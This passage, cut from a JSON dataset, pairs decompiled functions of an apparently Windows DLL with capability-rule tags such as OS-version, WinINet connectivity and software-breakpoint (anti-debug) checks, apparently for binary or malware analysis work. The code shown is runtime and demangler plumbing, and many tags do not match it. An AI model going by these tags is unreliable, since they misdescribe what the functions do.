0x125:\n                case 0x126:\n                case 0x127:\n                case 0x128:\n                case 0x129:\n                case 0x12a:\n                case 299:\n                case 300:\n                case 0x12d:\n                case 0x12e:\n                case 0x12f:\n                case 0x130:\n                case 0x131:\n                case 0x132:\n                case 0x133:\n                case 0x134:\n                case 0x135:\n                case 0x136:\n                case 0x137:\n                case 0x138:\n                case 0x139:\n                case 0x13a:\n                case 0x13b:\n                case 0x13c:\n                case 0x13d:\n                case 0x13e:\n                case 0x13f:\n                case 0x140:\n                    auVar1 = vmovntdq_avx(auVar12);\n                    *(pauVar3[6] + uVar6) = auVar1;\n                default:\n                    auVar1 = vmovdqu_avx(auVar12);\n                    *(pauVar3[-1] + uVar5) = auVar1;\n                case 0x100:\n                    auVar12 = vmovdqu_avx(auVar12);\n                    *arg1 = auVar12;\n                    vzeroupper_avx();\n                    return arg1;\n                }\n            }\n            do {\n                *pauVar2 = auVar12;\n                pauVar2[1] = auVar12;\n                pauVar2[2] = auVar12;\n                pauVar2[3] = auVar12;\n                pauVar2[4] = auVar12;\n                pauVar2[5] = auVar12;\n                pauVar2[6] = auVar12;\n                pauVar2[7] = auVar12;\n                pauVar2 = pauVar2[8];\n                arg3 = arg3 - 0x100;\n            } while (0xff < arg3);\n        }\n    // WARNING: Could not recover jumptable at 0x000180005344. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (27 cases) at 0x180097040\n        pauVar2 = (*(*((arg3 + 0x1f >> 5) * 4 + 0x180097040) + 0x180000000))\n                            (SUB328(auVar12, 0), pauVar2, uVar5 - iVar10);\n        return pauVar2;\n    }\n    for (; arg3 != 0; arg3 = arg3 - 1) {\n        (*pauVar2)[0] = noname_1;\n        pauVar2 = *pauVar2 + 1;\n    }\n    return arg1;\n}\n",
        "token_count": 4135
    },
    "1800058a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t fcn.1800058a8(int64_t arg1, int64_t arg2, uint64_t arg3)\n\n{\n    uint32_t *puVar1;\n    uint8_t uVar2;\n    uint64_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint8_t *puVar7;\n    uint8_t *puVar8;\n    \n    if (*(arg1 + 0x10) != 0) {\n        uVar5 = 0;\n        puVar7 = *(arg1 + 0x10) + *(arg2 + 8);\n        uVar6 = 0;\n        iVar4 = -1;\n        uVar3 = *puVar7 & 0xf;\n        puVar7 = puVar7 + -*(uVar3 + 0x180046150);\n        puVar1 = puVar7 + -4;\n        uVar2 = *(uVar3 + 0x180046160) & 0x1f;\n        if (*puVar1 >> uVar2 != 0) {\n            do {\n                puVar8 = puVar7 + -*((*puVar7 & 0xf) + 0x180046150);\n                uVar5 = uVar5 + (*(puVar8 + -4) >> (*((*puVar7 & 0xf) + 0x180046160) & 0x1f));\n                if (arg3 < uVar5 + **(arg2 + 0x10) + *(arg2 + 8)) break;\n                uVar6 = uVar6 + 1;\n                puVar7 = puVar8 + -*((*puVar8 & 0xf) + 0x180046150);\n                iVar4 = (*(puVar7 + -4) >> (*((*puVar8 & 0xf) + 0x180046160) & 0x1f)) - 1;\n            } while (uVar6 < *puVar1 >> uVar2);\n            if (uVar6 != 0) {\n                return iVar4;\n            }\n            return -1;\n        }\n    }\n    return -1;\n}\n",
        "token_count": 480
    },
    "1800082f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.1800082f8(int64_t *arg1, int64_t arg2, int64_t arg3, ulong arg4)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    uint32_t *puVar3;\n    uint32_t uVar4;\n    int64_t iVar5;\n    int32_t iVar6;\n    uint64_t uVar7;\n    uint8_t *puVar8;\n    int64_t *piVar9;\n    uint64_t arg2_00;\n    int64_t arg3_00;\n    ulong uVar10;\n    uchar auStack312 [32];\n    uint32_t **ppuStack280;\n    ulong uStack264;\n    ulong uStack256;\n    int32_t iStack248;\n    uint32_t uStack244;\n    uint32_t uStack240;\n    uint32_t *puStack232;\n    uint64_t uStack224;\n    int64_t *piStack216;\n    ulong uStack208;\n    int64_t *piStack200;\n    int32_t *piStack192;\n    int64_t *piStack184;\n    uchar auStack176 [16];\n    uint32_t *puStack160;\n    uint64_t uStack152;\n    uint uStack136;\n    uint uStack132;\n    uint uStack128;\n    uint uStack124;\n    uint32_t auStack120 [2];\n    uint64_t uStack112;\n    uint64_t uStack88;\n    \n    uStack88 = *0x180090000 ^ auStack312;\n    uStack240 = arg4;\n    piStack216 = arg1;\n    piStack200 = arg1;\n    uStack208 = fcn.180004708();\n    uVar4 = fcn.180005838(arg3, arg2);\n    arg2_00 = uVar4;\n    piVar1 = arg2 + 0x48;\n    piStack192 = piVar1;\n    if (*piVar1 == 0) {\n        iVar5 = fcn.1800055fc();\n        if (*(iVar5 + 0x78) != -2) {\n            iVar5 = fcn.1800055fc();\n            arg2_00 = *(iVar5 + 0x78);\n            iVar5 = fcn.1800055fc();\n            *(iVar5 + 0x78) = 0xfffffffe;\n        }\n    }\n    else {\n        iVar5 = fcn.1800055fc();\n        if (*(iVar5 + 0x78) != -2) {\n            fcn.180016c34();\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n        arg2_00 = *piVar1 - 2;\n    }\n    iVar5 = fcn.1800055fc();\n    *(iVar5 + 0x30) = *(iVar5 + 0x30) + 1;\n    piVar9 = arg2 + 8;\n    if (*(arg3 + 8) == 0) {\n        auStack120[0] = 0;\n    }\n    else {\n        puVar8 = *(arg3 + 8) + *piVar9;\n        uVar7 = *puVar8 & 0xf;\n        uStack112 = puVar8 - *(uVar7 + 0x180046150);\n        auStack120[0] = *(uStack112 - 4) >> (*(uVar7 + 0x180046160) & 0x1f);\n    }\n    uStack264 = auStack120;\n    puStack232 = auStack120;\n    ppuStack280 = &puStack232;\n    uStack256 = uStack112;\n    uStack224 = uStack112;\n    piStack184 = piVar9;\n    fcn.180008ab8(auStack120, arg2_00, arg4, &uStack264);\n    while( true ) {\n        uVar7 = uStack256;\n        puStack160 = auStack120;\n        uStack152 = uStack112;\n        if ((uStack256 < uStack112) || (uStack256 <= uStack224)) break;\n        fcn.1800088a4(uStack264, &uStack256);\n        puVar3 = uStack264;\n        auStack176 = *(uStack264 + 4);\n        uVar10 = SUB168(auStack176 >> 0x40, 0);\n        uStack256._0_4_ = uVar7;\n        uStack256._4_4_ = SUB84(uVar7, 4);\n        uStack136 = uStack264;\n        uStack132 = uStack264._4_4_;\n        uStack128 = uStack256;\n        uStack124 = uStack256._4_4_;\n        uStack256 = uVar7;\n        fcn.1800088a4(uStack264, &uStack256);\n        uStack256 = uVar7 - puVar3[4];\n        ppuStack280 = &uStack264;\n        uStack244 = fcn.180008b88(&puStack232, arg4, &uStack136, arg2_00);\n        arg2_00 = uStack244;\n        iVar6 = uVar10;\n        iStack248 = 0;\n        if (iVar6 != 0) {\n            iStack248 = uVar10 >> 0x20;\n        }\n        if (iStack248 != 0) {\n            *piVar1 = uStack244 + 2;\n            if (iVar6 - 1U < 2) {\n                iVar5 = *piStack216;\n                if (iVar6 == 2) {\n                    arg3_00 = *(auStack176._12_4_ + iVar5);\n                }\n                else {\n                    arg3_00 = auStack176._12_4_ + iVar5;\n                }\n                fcn.180012130(iStack248 + *piVar9, iVar5, arg3_00, 0x103);\n            }\n            else {\n                fcn.180012080(iStack248 + *piVar9, arg1, 0x103);\n            }\n            fcn.180004730(uStack208);\n        }\n    }\n    iVar5 = fcn.1800055fc();\n    if (0 < *(iVar5 + 0x30)) {\n        iVar5 = fcn.1800055fc();\n        *(iVar5 + 0x30) = *(iVar5 + 0x30) + -1;\n    }\n    fcn.1800024e0(uStack88 ^ auStack312);\n    return;\n}\n",
        "token_count": 1446
    },
    "18000902": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.18000902c(ulong *arg1, uchar *arg2, ulong arg3)\n\n{\n    uchar uVar1;\n    int64_t arg1_00;\n    code **ppcVar2;\n    \n    if ((arg2 == NULL) || (arg3 < 1)) {\n        *(arg1 + 1) = 2;\n        return;\n    }\n    if (arg3 == 1) {\n        ppcVar2 = fcn.18000d95c(0x1800914e0, 0x10);\n        if (ppcVar2 != NULL) {\n            uVar1 = *arg2;\n            *ppcVar2 = vtable.charNode.0;\n            *(ppcVar2 + 1) = uVar1;\n            goto code_r0x00018000907f;\n        }\n    }\n    else {\n        arg1_00 = fcn.18000d95c(0x1800914e0, 0x18);\n        if (arg1_00 != 0) {\n            ppcVar2 = fcn.180008e90(arg1_00, arg2, arg3);\n            goto code_r0x00018000907f;\n        }\n    }\n    ppcVar2 = NULL;\ncode_r0x00018000907f:\n    *arg1 = ppcVar2;\n    if (ppcVar2 == NULL) {\n        *(arg1 + 1) = 3;\n    }\n    return;\n}\n",
        "token_count": 326
    },
    "18000969": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0001800096b6)\n\nulong * fcn.180009694(ulong *arg1, ulong arg2)\n\n{\n    *(arg1 + 1) = 0;\n    *(arg1 + 1) = arg2;\n    if (arg2 == 1) {\n        *arg1 = 0x180047780;\n    }\n    else {\n        *arg1 = 0;\n    }\n    return arg1;\n}\n",
        "token_count": 105
    },
    "18000994": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint64_t * fcn.180009944(int64_t *arg1, int64_t *arg2)\n\n{\n    int64_t arg2_00;\n    \n    if (*(arg1 + 1) < '\\x02') {\n        arg2_00 = *arg2;\n        if (*arg1 == 0) {\n            if (arg2_00 == 0) {\n                fcn.180009694(arg1, *(arg2 + 1));\n            }\n            else {\n                *arg1 = arg2_00;\n                *(arg1 + 1) = *(arg2 + 1);\n            }\n        }\n        else if (arg2_00 == 0) {\n            if (*(arg2 + 1) != 0) {\n                fcn.180009a9c(arg1, *(arg2 + 1));\n            }\n        }\n        else {\n            fcn.180008f24(arg1, arg2_00);\n        }\n    }\n    return arg1;\n}\n",
        "token_count": 214
    },
    "180009a9": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint64_t * fcn.180009a9c(int64_t *arg1, ulong arg2)\n\n{\n    uint32_t uVar1;\n    int64_t arg2_00;\n    \n    if (*(arg1 + 1) < '\\x02') {\n        if ((*arg1 == 0) || (uVar1 = arg2,  uVar1 - 2 < 2)) {\n            fcn.180009694(arg1, arg2);\n        }\n        else if (uVar1 != 0) {\n            if (uVar1 < 4) {\n                arg2_00 = uVar1 * 0x10 + 0x180047770;\n            }\n            else {\n                arg2_00 = 0x1800477a0;\n            }\n            fcn.180008f24(arg1, arg2_00);\n        }\n    }\n    return arg1;\n}\n",
        "token_count": 196
    },
    "18000ac7": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint64_t * fcn.18000ac78(int64_t *arg1)\n\n{\n    char cVar1;\n    uint8_t uVar2;\n    bool bVar3;\n    char *pcVar4;\n    int64_t *piVar5;\n    uint64_t arg2;\n    int64_t iVar6;\n    ulong uStack56;\n    uint uStack48;\n    uchar auStack40 [16];\n    uchar auStack24 [16];\n    \n    *arg1 = 0;\n    *(arg1 + 1) = 0;\n    bVar3 = true;\n    do {\n        if (**0x1800914b8 == '@') {\n            return arg1;\n        }\n        if (**0x1800914b8 == 'Z') {\n            return arg1;\n        }\n        if (bVar3) {\n            bVar3 = false;\n        }\n        else {\n            fcn.18000999c(arg1);\n        }\n        pcVar4 = *0x1800914b8;\n        if (**0x1800914b8 == '\\0') {\n            if ('\\x01' < *(arg1 + 1)) {\n                return arg1;\n            }\n            if (*arg1 != 0) {\n                fcn.180008f24(arg1, 0x180047780);\n                return arg1;\n            }\n            fcn.180009694(arg1, 1);\n            return arg1;\n        }\n        cVar1 = **0x1800914b8;\n        if (cVar1 - 0x30U < 10) {\n            *0x1800914b8 = *0x1800914b8 + 1;\n            piVar5 = fcn.1800096c4(*0x1800914a0, auStack24, cVar1 - 0x30U);\n            if (*(arg1 + 1) < '\\x02') {\n                iVar6 = *piVar5;\n                if (*arg1 == 0) {\n                    if (iVar6 == 0) {\n                        arg2 = *(piVar5 + 1);\ncode_r0x00018000ad18:\n                        fcn.180009694(arg1, arg2);\n                    }\n                    else {\n                        *arg1 = iVar6;\n                        *(arg1 + 1) = *(piVar5 + 1);\n                    }\n                }\n                else if (iVar6 == 0) {\n                    uVar2 = *(piVar5 + 1);\n                    arg2 = uVar2;\n                    if (uVar2 != 0) {\n                        if (uVar2 - 2U < 2) goto code_r0x00018000ad18;\n                        if (uVar2 < 4) {\n                            iVar6 = arg2 * 0x10 + 0x180047770;\n                        }\n                        else {\n                            iVar6 = 0x1800477a0;\n                        }\n                        fcn.180008f24(arg1, iVar6);\n                    }\n                }\n                else {\n                    fcn.180008f24(arg1, iVar6);\n                }\n            }\n        }\n        else {\n            uStack56 = 0;\n            uStack48 = 0;\n            fcn.18000e610(auStack40, &uStack56);\n            if ((1 < *0x1800914b8 - pcVar4) && (**0x1800914a0 != 9)) {\n                fcn.180009af4(*0x1800914a0, auStack40);\n            }\n            fcn.180009944(arg1, auStack40);\n            if (*0x1800914b8 == pcVar4) {\n                *(arg1 + 1) = 0;\n                *arg1 = 0;\n                *(arg1 + 1) = 2;\n            }\n        }\n        if (*(arg1 + 1) != '\\0') {\n            return arg1;\n        }\n    } while( true );\n}\n",
        "token_count": 858
    },
    "18000af7": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nulong * fcn.18000af78(ulong *arg1)\n\n{\n    ulong arg2;\n    ulong uStack40;\n    uint uStack32;\n    uchar auStack24 [16];\n    \n    if (**0x1800914b8 == '\\0') {\n        *(arg1 + 1) = 0;\n        *arg1 = 0x180047780;\n    }\n    else {\n        fcn.18000fd5c(&uStack40);\n        fcn.18000999c(&uStack40);\n        arg2 = fcn.18000fd5c(auStack24);\n        fcn.180009944(&uStack40, arg2);\n        fcn.18000999c(&uStack40);\n        if (**0x1800914b8 == '@') {\n            *0x1800914b8 = *0x1800914b8 + 1;\n            *arg1 = uStack40;\n            *(arg1 + 1) = uStack32;\n        }\n        else {\n            *(arg1 + 1) = 0;\n            *arg1 = 0;\n            *(arg1 + 1) = 2;\n        }\n    }\n    return arg1;\n}\n",
        "token_count": 264
    },
    "18000b01": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nulong * fcn.18000b014(ulong *arg1)\n\n{\n    ulong uVar1;\n    ulong uStack40;\n    uint uStack32;\n    uchar auStack24 [16];\n    \n    if (**0x1800914b8 == '\\0') {\n        *(arg1 + 1) = 0;\n        *arg1 = 0x180047780;\n    }\n    else {\n        uVar1 = fcn.1800102ac(auStack24);\n        fcn.180009828(uVar1, &uStack40);\n        while( true ) {\n            uVar1 = fcn.18000fd5c(auStack24);\n            fcn.180009944(&uStack40, uVar1);\n            if (**0x1800914b8 != '@') break;\n            if ((*0x1800914b8)[1] == '@') {\n                *0x1800914b8 = *0x1800914b8 + 2;\n                fcn.18000999c(&uStack40);\n                *arg1 = uStack40;\n                *(arg1 + 1) = uStack32;\n                return arg1;\n            }\n            *0x1800914b8 = *0x1800914b8 + 1;\n            fcn.18000999c(&uStack40);\n        }\n        *(arg1 + 1) = 0;\n        *arg1 = 0;\n        *(arg1 + 1) = 2;\n    }\n    return arg1;\n}\n",
        "token_count": 334
    },
    "18000e61": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint64_t * fcn.18000e610(int64_t *arg1, int64_t *arg2)\n\n{\n    char cVar1;\n    ulong *arg1_00;\n    char *pcVar2;\n    char *arg2_00;\n    ulong uVar3;\n    ulong var_20h;\n    ulong var_18h;\n    char *var_bp_10h;\n    ulong var_bp_8h;\n    \n    var_20h = 0;\n    var_18h._0_4_ = 0;\n    cVar1 = **0x1800914b8;\n    pcVar2 = *0x1800914b8;\n    if (cVar1 == '\\0') {\ncode_r0x00018000e897:\n        *0x1800914b8 = pcVar2;\n        var_bp_8h._0_4_ = 0;\n        var_bp_10h = 0x180047780;\n        arg1_00 = &var_bp_10h;\ncode_r0x00018000e8aa:\n        fcn.1800097fc(arg1_00, arg1, arg2);\n        return arg1;\n    }\n    if (cVar1 == '$') {\n        if ((*0x1800914b8)[1] == '$') {\n            pcVar2 = *0x1800914b8 + 2;\n            cVar1 = *pcVar2;\n            if (cVar1 < 'S') {\n                if (cVar1 == 'R') {\n                    if (*arg2 == 0) {\n                        uVar3 = 8;\n                        arg2_00 = \"volatile\";\n                    }\n                    else {\n                        uVar3 = 9;\n                        arg2_00 = \"volatile \";\n                    }\n                    *0x1800914b8 = pcVar2;\n                    fcn.180008f88(&var_20h, arg2_00, uVar3);\n                }\n                else {\n                    if (cVar1 == '\\0') goto code_r0x00018000e897;\n                    if (cVar1 == 'A') {\n                        *0x1800914b8 = *0x1800914b8 + 3;\n                        fcn.18000d29c(arg1, arg2);\n                        return arg1;\n                    }\n                    if (cVar1 == 'B') {\n                        *0x1800914b8 = *0x1800914b8 + 3;\n                        fcn.18000e8c8(arg1, arg2, 1);\n                        return arg1;\n                    }\n                    if (cVar1 == 'C') {\n                        *0x1800914b8 = *0x1800914b8 + 3;\n                        var_bp_10h = NULL;\n                        var_bp_8h._0_4_ = 0;\n                        arg2 = fcn.18000bc98(&var_20h, arg2, 0, &var_bp_10h);\n                        goto code_r0x00018000e65b;\n                    }\n                    *0x1800914b8 = pcVar2;\n                    if (cVar1 != 'Q') goto code_r0x00018000e6de;\n                }\n                uVar3 = 3;\n                goto code_r0x00018000e69f;\n            }\n            if (cVar1 == 'S') {\n                pcVar2 = *0x1800914b8 + 3;\n            }\n            else {\n                if (cVar1 == 'T') {\n                    *0x1800914b8 = *0x1800914b8 + 3;\n                    if (*arg2 == 0) {\n                        var_bp_10h = \"std::nullptr_t\";\n                        var_bp_8h._0_4_ = 0xe;\n                        fcn.1800092a8(arg1, &var_bp_10h);\n                        return arg1;\n                    }\n                    var_bp_10h = \"std::nullptr_t \";\n                    var_bp_8h._0_4_ = 0xf;\n                    arg1_00 = fcn.1800092a8(&var_20h, &var_bp_10h);\n                    goto code_r0x00018000e8aa;\n                }\n                if (cVar1 == 'V') {\n                    *0x1800914b8 = *0x1800914b8 + 3;\n                    *arg1 = *arg2;\n                    *(arg1 + 1) = *(arg2 + 1);\n                    return arg1;\n                }\n                if (cVar1 == 'Y') {\n                    *0x1800914b8 = *0x1800914b8 + 3;\n                    fcn.18000f350(arg1);\n                    return arg1;\n                }\n            }\n        }\n        else if ((*0x1800914b8)[1] == '\\0') goto code_r0x00018000e897;\ncode_r0x00018000e6de:\n        *0x1800914b8 = pcVar2;\n        *(arg1 + 1) = 0;\n        *(arg1 + 1) = 2;\n        *arg1 = 0;\n    }\n    else {\n        if (cVar1 != 'A') {\n            if (cVar1 != 'B') {\ncode_r0x00018000e65b:\n                fcn.18000b410(arg1, arg2);\n                return arg1;\n            }\n            if (*arg2 == 0) {\n                uVar3 = 8;\n                pcVar2 = \"volatile\";\n            }\n            else {\n                uVar3 = 9;\n                pcVar2 = \"volatile \";\n            }\n            fcn.180008f88(&var_20h, pcVar2, uVar3);\n        }\n        uVar3 = 2;\ncode_r0x00018000e69f:\n        var_bp_10h = *arg2;\n        *0x1800914b8 = *0x1800914b8 + 1;\n        var_bp_8h._0_4_ = *(arg2 + 1) | 0x100;\n        fcn.18000ea94(arg1, &var_20h, &var_bp_10h, uVar3);\n    }\n    return arg1;\n}\n",
        "token_count": 1389
    },
    "18000f8a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nulong * fcn.18000f8ac(ulong *arg1)\n\n{\n    uint32_t uVar1;\n    char cVar2;\n    uint uVar3;\n    int32_t iVar4;\n    bool bVar5;\n    bool bVar6;\n    int32_t *piVar7;\n    char *pcVar8;\n    int64_t *piVar9;\n    int64_t iVar10;\n    int64_t iStack136;\n    uint uStack128;\n    ulong uStack120;\n    uint uStack112;\n    ulong uStack104;\n    uint uStack96;\n    uint uStack92;\n    uint uStack88;\n    uint uStack84;\n    uint uStack80;\n    uint uStack76;\n    uchar auStack72 [16];\n    uchar auStack56 [16];\n    uchar auStack40 [16];\n    \n    uStack120 = 0;\n    bVar5 = true;\n    uStack112 = 0;\n    *0x1800914cd = 1;\n    do {\n        pcVar8 = *0x1800914b8;\n        cVar2 = **0x1800914b8;\n        if ((cVar2 & 0xbfU) == 0) break;\n        iStack136 = 0;\n        uVar1 = cVar2 - 0x30;\n        uStack128 = 0;\n        bVar6 = false;\n        if (uVar1 < 10) {\n            *0x1800914b8 = *0x1800914b8 + 1;\n            piVar9 = fcn.1800096c4(*0x1800914b0, auStack72, uVar1);\n            iVar10 = *piVar9;\n            iStack136 = iVar10;\n            uStack128 = *(piVar9 + 1);\n            goto code_r0x00018000fa1d;\n        }\n        if ((cVar2 == '$') && ((*0x1800914b8)[1] == '$')) {\n            cVar2 = (*0x1800914b8)[2];\n            if (cVar2 == '$') {\n                if ((*0x1800914b8)[3] != 'V') goto code_r0x00018000f968;\n                *0x1800914b8 = *0x1800914b8 + 4;\n            }\n            else {\n                if (cVar2 == 'U') {\ncode_r0x00018000f991:\n                    *0x1800914b8 = *0x1800914b8 + 3;\n                    goto code_r0x00018000f968;\n                }\n                if (cVar2 != 'V') {\n                    if (cVar2 == 'W') {\n                        bVar6 = true;\n                        goto code_r0x00018000f991;\n                    }\n                    if (cVar2 != 'Z') goto code_r0x00018000f968;\n                }\n                *0x1800914b8 = *0x1800914b8 + 3;\n            }\n        }\n        else {\ncode_r0x00018000f968:\n            if ((**0x1800914b8 == '$') && ((*0x1800914b8)[1] != '$')) {\n                *0x1800914b8 = *0x1800914b8 + 1;\n                piVar9 = fcn.18000fd5c(auStack56);\n            }\n            else {\n                piVar9 = fcn.1800102ac(auStack40);\n            }\n            piVar7 = *0x1800914b0;\n            uVar3 = *(piVar9 + 1);\n            iVar10 = *piVar9;\n            iStack136 = iVar10;\n            uStack128 = uVar3;\n            if ((*0x1800914b8 - pcVar8 < 2) || (**0x1800914b0 == 9)) {\ncode_r0x00018000fa1d:\n                if (iVar10 != 0) {\n                    if (!bVar5) {\n                        fcn.18000999c(&uStack120);\n                    }\n                    fcn.180009944(&uStack120, &iStack136);\n                    if (bVar6) {\n                        uStack96 = 3;\n                        uStack104 = 0x18004714c;\n                        uStack88 = 0x8004714c;\n                        uStack84 = 1;\n                        uStack80 = 3;\n                        uStack76 = uStack92;\n                        fcn.1800098c4(&uStack120, &uStack88);\n                    }\n                    goto code_r0x00018000fa74;\n                }\n            }\n            else if (iVar10 != 0) {\n                piVar9 = fcn.18000d95c(0x1800914e0, 0x10);\n                if (piVar9 != NULL) {\n                    *piVar9 = iVar10;\n                    *(piVar9 + 1) = uVar3;\n                    iVar4 = *piVar7;\n                    *piVar7 = iVar4 + 1;\n                    *(piVar7 + iVar4 * 2 + 4) = piVar9;\n                }\n                goto code_r0x00018000fa1d;\n            }\n            if ('\\x01' < uStack128) {\n                *(arg1 + 1) = 0;\n                *arg1 = 0;\n                *(arg1 + 1) = 2;\n                return arg1;\n            }\n        }\ncode_r0x00018000fa74:\n        bVar5 = false;\n    } while (uStack112 == '\\0');\n    *arg1 = uStack120;\n    *(arg1 + 1) = uStack112;\n    *0x1800914cd = 0;\n    return arg1;\n}\n",
        "token_count": 1283
    },
    "180010d0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_fh\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Variable defined which should be unmapped: var_17h\n\nulong * fcn.180010d00(ulong *arg1, ulong *arg2)\n\n{\n    uint uVar1;\n    ulong uVar2;\n    ulong *puVar3;\n    uint *arg2_00;\n    ulong var_fh;\n    ulong var_17h;\n    ulong var_27h;\n    ulong var_37h;\n    ulong var_47h;\n    ulong uStack104;\n    uint uStack96;\n    char *pcStack88;\n    uint uStack80;\n    uint uStack76;\n    uint uStack72;\n    uint uStack68;\n    uint uStack64;\n    uint uStack60;\n    uint uStack56;\n    uint uStack52;\n    uint uStack48;\n    uchar auStack40 [16];\n    uchar auStack24 [7];\n    ulong var_9h;\n    ulong var_1h;\n    \n    *arg1 = *arg2;\n    uVar1 = *(arg2 + 1);\n    *(arg1 + 1) = uVar1;\n    if (uVar1 < '\\x02') {\n        uStack80 = 0;\n        if (**0x1800914b8 == '\\0') {\n            pcStack88 = 0x180047780;\n            fcn.1800097fc(&pcStack88, &uStack104, arg1);\n            *arg1 = uStack104;\n            *(arg1 + 1) = uStack96;\n        }\n        else {\n            uStack104 = 0;\n            uStack96 = 0;\n            pcStack88 = NULL;\n            fcn.18000bc98(&uStack72, &pcStack88, 0, &uStack104);\n            uVar2 = fcn.180009828(&uStack72, &uStack56);\n            puVar3 = fcn.1800097fc(uVar2, auStack40, arg1);\n            *arg1 = *puVar3;\n            uVar1 = *(puVar3 + 1);\n            *(arg1 + 1) = uVar1;\n            if (uVar1 < '\\x02') {\n                if (**0x1800914b8 != '@') {\n                    uStack80 = 5;\n                    pcStack88 = \"{for \";\n                    arg2_00 = &uStack72;\n                    uStack72 = 0x8004755c;\n                    uStack68 = 1;\n                    uStack64 = 5;\n                    uStack60 = uStack76;\n                    do {\n                        fcn.1800098c4(arg1, arg2_00);\n                        do {\n                            if ('\\x01' < *(arg1 + 1)) {\ncode_r0x000180010eb8:\n                                if (**0x1800914b8 != '@') {\n                                    return arg1;\n                                }\n                                goto code_r0x000180010ebd;\n                            }\n                            if (**0x1800914b8 == '\\0') {\ncode_r0x000180010e9a:\n                                fcn.180009a9c(arg1, 1);\ncode_r0x000180010ea7:\n                                fcn.18000999c(arg1);\n                                goto code_r0x000180010eb8;\n                            }\n                            if (**0x1800914b8 == '@') {\n                                if ('\\x01' < *(arg1 + 1)) goto code_r0x000180010eb8;\n                                if (**0x1800914b8 == '\\0') goto code_r0x000180010e9a;\n                                goto code_r0x000180010ea7;\n                            }\n                            uVar2 = fcn.18000ee94(auStack40);\n                            uStack104 = 0;\n                            uStack96 = 0;\n                            fcn.18000ab3c(&uStack104);\n                            fcn.1800097fc(&uStack104, &uStack72, uVar2);\n                            uVar2 = fcn.180009828(&uStack72, auStack24);\n                            fcn.180009944(arg1, uVar2);\n                            if (**0x1800914b8 == '@') {\n                                *0x1800914b8 = *0x1800914b8 + 1;\n                            }\n                        } while (('\\x01' < *(arg1 + 1)) || (**0x1800914b8 == '@'));\n                        uStack80 = 2;\n                        pcStack88 = 0x180047564;\n                        arg2_00 = &uStack56;\n                        uStack56 = 0x80047564;\n                        uStack52 = 1;\n                        uStack48 = 2;\n                    } while( true );\n                }\ncode_r0x000180010ebd:\n                *0x1800914b8 = *0x1800914b8 + 1;\n            }\n        }\n    }\n    return arg1;\n}\n",
        "token_count": 1099
    },
    "1800121b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
